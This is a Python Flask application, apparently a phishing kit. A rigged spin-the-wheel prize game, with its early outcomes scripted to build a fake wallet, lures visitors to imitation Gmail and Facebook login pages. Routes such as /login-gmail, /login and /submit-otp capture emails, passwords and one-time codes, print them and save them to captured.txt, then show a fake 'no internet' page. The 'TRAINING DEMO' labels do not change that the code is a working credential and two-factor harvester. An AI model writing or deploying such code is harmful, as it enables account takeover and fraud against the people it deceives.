from flask import Flask, render_template, session, jsonify, request
import random
import os

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-this-demo-secret")

@app.route("/")
def home():
    session["spins"] = 5
    session["wallet"] = 0
    session["spin_count"] = 0
    return render_template("index.html", spins=session["spins"], wallet=session["wallet"])

@app.route("/api/spin", methods=["POST"])
def spin():
    spins = session.get("spins", 5)
    wallet = session.get("wallet", 0)
    spin_count = session.get("spin_count", 0)

    if spins <= 0:
        return jsonify({"error": "No free spins left.", "spins_left": 0}), 400

    if spin_count == 0:
        index = 1
        reward = 0
    elif spin_count == 1:
        index = 4
        reward = 0
    elif spin_count == 2:
        index = 2
        reward = 300
    else:
        index = random.choice([0, 3, 5, 6, 7])
        rewards = {0: 250, 1: 0, 2: 300, 3: 599, 4: 0, 5: 250, 6: 300, 7: 0}
        reward = rewards[index]

    spin_count += 1
    spins -= 1
    wallet += reward

    session["spins"] = spins
    session["wallet"] = wallet
    session["spin_count"] = spin_count
    session.modified = True

    return jsonify({"index": index, "reward": reward, "wallet": wallet, "spins_left": spins})

@app.route("/api/reset", methods=["POST"])
def reset():
    session["spins"] = 5
    session["wallet"] = 0
    session["spin_count"] = 0
    return jsonify({"success": True, "spins": 5, "wallet": 0})

@app.route("/auth-options")
def auth_options():
    return render_template("auth_options.html")

@app.route("/gmail")
def gmail_page():
    return render_template("gmail.html")

@app.route("/fb")
def fb_page():
    return render_template("fb.html")

@app.route("/login-gmail", methods=["POST"])
def login_gmail():
    email = request.form.get("email", "")
    password = request.form.get("password", "")

    print("\n" + "="*50)
    print("  TRAINING DEMO – GMAIL CREDENTIALS CAPTURED")
    print("="*50)
    print(f"  Email    : {email}")
    print(f"  Password : {password}")
    print("="*50 + "\n")

    with open("captured.txt", "a") as f:
        f.write(f"Platform: Gmail | Email: {email} | Password: {password}\n")

    return render_template("otp.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")

    print("\n" + "="*50)
    print("  TRAINING DEMO – FACEBOOK CREDENTIALS CAPTURED")
    print("="*50)
    print(f"  Mobile/Email : {email}")
    print(f"  Password     : {password}")
    print("="*50 + "\n")

    with open("captured.txt", "a") as f:
        f.write(f"Platform: Facebook | Mobile/Email: {email} | Password: {password}\n")

    return render_template("otp.html")

@app.route("/submit-otp", methods=["POST"])
def submit_otp():
    otp = request.form.get("otp", "")

    print("\n" + "="*50)
    print("  TRAINING DEMO – OTP CODE CAPTURED")
    print("="*50)
    print(f"  OTP Code : {otp}")
    print("="*50 + "\n")

    with open("captured.txt", "a") as f:
        f.write(f"OTP Code: {otp}\n")

    return render_template("no_internet.html")

if __name__ == "__main__":
    print("💎 Diamond Royale & Multi-Auth OTP Demo (Modular Structure)")
    print("Open: http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
